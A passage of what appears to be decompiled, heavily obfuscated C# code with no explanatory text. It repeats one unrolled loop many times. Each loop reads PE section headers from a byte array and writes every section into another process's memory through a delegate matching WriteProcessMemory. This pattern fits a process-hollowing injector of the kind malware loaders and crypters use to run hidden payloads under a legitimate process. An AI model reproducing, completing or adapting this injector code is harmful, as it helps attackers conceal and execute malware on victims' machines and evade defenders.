					((byte*)ptr)[3756] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3756] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 624)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 628)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 632)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3754] = ((*(int*)((byte*)ptr + 628) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3754] != 0)
					{
						byte[] array51;
						checked
						{
							array51 = new byte[*unchecked((int*)((byte*)ptr + 628)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 632), array51, 0, array51.Length);
						((byte*)ptr)[3755] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 624))), array51, array51.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3755] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3759] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3759] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 636)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 640)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 644)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3757] = ((*(int*)((byte*)ptr + 640) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3757] != 0)
					{
						byte[] array52;
						checked
						{
							array52 = new byte[*unchecked((int*)((byte*)ptr + 640)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 644), array52, 0, array52.Length);
						((byte*)ptr)[3758] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 636))), array52, array52.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3758] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3762] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3762] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 648)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 652)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 656)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3760] = ((*(int*)((byte*)ptr + 652) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3760] != 0)
					{
						byte[] array53;
						checked
						{
							array53 = new byte[*unchecked((int*)((byte*)ptr + 652)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 656), array53, 0, array53.Length);
						((byte*)ptr)[3761] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 648))), array53, array53.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3761] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3765] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3765] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 660)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 664)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 668)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3763] = ((*(int*)((byte*)ptr + 664) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3763] != 0)
					{
						byte[] array54;
						checked
						{
							array54 = new byte[*unchecked((int*)((byte*)ptr + 664)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 668), array54, 0, array54.Length);
						((byte*)ptr)[3764] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 660))), array54, array54.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3764] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3768] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3768] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 672)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 676)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 680)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3766] = ((*(int*)((byte*)ptr + 676) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3766] != 0)
					{
						byte[] array55;
						checked
						{
							array55 = new byte[*unchecked((int*)((byte*)ptr + 676)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 680), array55, 0, array55.Length);
						((byte*)ptr)[3767] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 672))), array55, array55.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3767] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3771] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3771] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 684)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 688)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 692)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3769] = ((*(int*)((byte*)ptr + 688) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3769] != 0)
					{
						byte[] array56;
						checked
						{
							array56 = new byte[*unchecked((int*)((byte*)ptr + 688)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 692), array56, 0, array56.Length);
						((byte*)ptr)[3770] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 684))), array56, array56.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3770] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3774] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3774] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 696)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 700)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 704)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3772] = ((*(int*)((byte*)ptr + 700) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3772] != 0)
					{
						byte[] array57;
						checked
						{
							array57 = new byte[*unchecked((int*)((byte*)ptr + 700)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 704), array57, 0, array57.Length);
						((byte*)ptr)[3773] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 696))), array57, array57.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3773] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3777] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3777] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 708)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 712)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 716)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3775] = ((*(int*)((byte*)ptr + 712) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3775] != 0)
					{
						byte[] array58;
						checked
						{
							array58 = new byte[*unchecked((int*)((byte*)ptr + 712)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 716), array58, 0, array58.Length);
						((byte*)ptr)[3776] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 708))), array58, array58.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3776] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3780] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3780] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 720)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 724)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 728)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3778] = ((*(int*)((byte*)ptr + 724) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3778] != 0)
					{
						byte[] array59;
						checked
						{
							array59 = new byte[*unchecked((int*)((byte*)ptr + 724)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 728), array59, 0, array59.Length);
						((byte*)ptr)[3779] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 720))), array59, array59.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3779] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3783] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3783] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 732)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 736)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 740)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3781] = ((*(int*)((byte*)ptr + 736) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3781] != 0)
					{
						byte[] array60;
						checked
						{
							array60 = new byte[*unchecked((int*)((byte*)ptr + 736)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 740), array60, 0, array60.Length);
						((byte*)ptr)[3782] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 732))), array60, array60.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3782] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3786] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3786] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 744)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 748)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 752)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3784] = ((*(int*)((byte*)ptr + 748) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3784] != 0)
					{
						byte[] array61;
						checked
						{
							array61 = new byte[*unchecked((int*)((byte*)ptr + 748)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 752), array61, 0, array61.Length);
						((byte*)ptr)[3785] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 744))), array61, array61.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3785] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3789] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3789] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 756)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 760)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 764)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3787] = ((*(int*)((byte*)ptr + 760) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3787] != 0)
					{
						byte[] array62;
						checked
						{
							array62 = new byte[*unchecked((int*)((byte*)ptr + 760)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 764), array62, 0, array62.Length);
						((byte*)ptr)[3788] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 756))), array62, array62.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3788] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3792] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3792] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 768)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 772)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 776)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3790] = ((*(int*)((byte*)ptr + 772) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3790] != 0)
					{
						byte[] array63;
						checked
						{
							array63 = new byte[*unchecked((int*)((byte*)ptr + 772)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 776), array63, 0, array63.Length);
						((byte*)ptr)[3791] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 768))), array63, array63.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3791] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3795] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3795] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 780)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 784)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 788)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3793] = ((*(int*)((byte*)ptr + 784) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3793] != 0)
					{
						byte[] array64;
						checked
						{
							array64 = new byte[*unchecked((int*)((byte*)ptr + 784)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 788), array64, 0, array64.Length);
						((byte*)ptr)[3794] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 780))), array64, array64.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3794] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3798] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3798] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 792)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 796)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 800)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3796] = ((*(int*)((byte*)ptr + 796) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3796] != 0)
					{
						byte[] array65;
						checked
						{
							array65 = new byte[*unchecked((int*)((byte*)ptr + 796)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 800), array65, 0, array65.Length);
						((byte*)ptr)[3797] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 792))), array65, array65.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3797] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3801] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3801] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 804)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 808)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 812)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3799] = ((*(int*)((byte*)ptr + 808) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3799] != 0)
					{
						byte[] array66;
						checked
						{
							array66 = new byte[*unchecked((int*)((byte*)ptr + 808)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 812), array66, 0, array66.Length);
						((byte*)ptr)[3800] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 804))), array66, array66.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3800] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3804] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3804] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 816)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 820)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 824)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3802] = ((*(int*)((byte*)ptr + 820) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3802] != 0)
					{
						byte[] array67;
						checked
						{
							array67 = new byte[*unchecked((int*)((byte*)ptr + 820)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 824), array67, 0, array67.Length);
						((byte*)ptr)[3803] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 816))), array67, array67.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3803] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3807] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3807] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 828)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 832)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 836)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3805] = ((*(int*)((byte*)ptr + 832) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3805] != 0)
					{
						byte[] array68;
						checked
						{
							array68 = new byte[*unchecked((int*)((byte*)ptr + 832)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 836), array68, 0, array68.Length);
						((byte*)ptr)[3806] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 828))), array68, array68.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3806] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3810] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3810] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 840)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 844)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 848)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3808] = ((*(int*)((byte*)ptr + 844) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3808] != 0)
					{
						byte[] array69;
						checked
						{
							array69 = new byte[*unchecked((int*)((byte*)ptr + 844)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 848), array69, 0, array69.Length);
						((byte*)ptr)[3809] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 840))), array69, array69.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3809] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3813] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3813] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 852)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 856)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 860)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
